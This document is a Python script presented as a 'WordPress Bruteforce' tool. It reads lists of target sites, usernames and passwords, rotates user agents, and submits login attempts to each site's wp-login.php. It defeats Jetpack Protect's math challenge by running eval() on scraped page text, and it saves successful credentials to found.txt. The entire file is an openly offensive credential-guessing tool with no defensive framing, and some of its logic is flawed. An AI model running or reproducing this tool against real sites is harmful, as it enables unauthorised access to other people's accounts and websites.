#!/usr/bin/python3.9
#
# WordPress Bruteforcing Tool

import requests,urllib,os,re,random

banner = """
  _________________
    _______________\\
   WordPress Bruteforce
 __________________|
 by EtcAug10
      _____________|
___________________/
"""

ua = urllib.request.urlopen("https://raw.githubusercontent.com/cvandeplas/pystemon/master/user-agents.txt").read()
ua = ua.decode("utf-8").splitlines()

class main():
    def __init__(ekse):
        os.system('clear')
        print(banner)
        ekse.start = 0
        ekse.post()
        ekse.getup()
        ekse.brute()

    def post(ekse):
        try:
            tlist = input("Get target list: ")
            topen = open(tlist,'rb')
            targets = topen.read().decode('utf8')
            ekse.site = targets.splitlines()
        except Exception as _er:
            quit("Something wrong\n"+_er)

    def getup(ekse):
        try:
            usrs = input("Get list user (example user.txt): ")
            pws = input("Get list password (example pass.txt): ")
            usrsopen = open(usrs,'rb').read()
            ekse.user = usrsopen.splitlines()
            pwsopen = open(pws,'rb').read()
            ekse.passwd = pwsopen.splitlines()
        except Exception as _er:
            quit("Something wrong %s \n" % (_er))

    def brute(ekse):
        print("Getting target..")
        print("Getting user list..")
        print("Getting pass list..")
        for sites in ekse.site:
                requests.Session().headers.update({'user-agent':random.choice(ua)})
                listt = urllib.request.urlsplit(sites)
                urels = listt.netloc
                print("Attacking %s" % (urels))
                for user,passwd in zip(ekse.user,ekse.passwd):
                    try:
                        data = {}
                        url = "http://"+urels+"wp-login.php"
                        resp = requests.get(url)
                        if resp.status_code != 200:
                           print("(?) Login page not found :(")
                           continue
                        for dat,val in re.findall(r'name="(.*?)".*?value="(.*?)"',resp.text):
                           data.update({dat:val})
                        if 'jetpack_protect_num' in resp.text.lower():
                            info = re.findall(r'\n\t\t\t\t\t(.*?)=.*?\t\t\t\t',resp.text)[0].split(' ')
                            catch = (''.join(info)).replace('x','*').replace('&nbsp;','')
                            cval = str(eval(catch))
                            print('(/) user agent\'s blocked')
                            data.update({'jetpack_protect_num':cval})
                        else:
                            pass
                        data.update({'log':user,'pwd':passwd})
                        req = requests.post(url,data).text
                        if 'dashboard' in req:
                            ekse.start += 1
                            print("(!) Found: "+url+" User:"+user+" & pass "+passwd)
                            open('found.txt','a').write(url+"= "+user+" | "+passwd)
                            break
                        else:
                            print("Failed")
                        continue
                    except:
                        print("Unknown Error #-_")
                        continue
        quit("It's busy here.. Huh. Done ^_^")

main()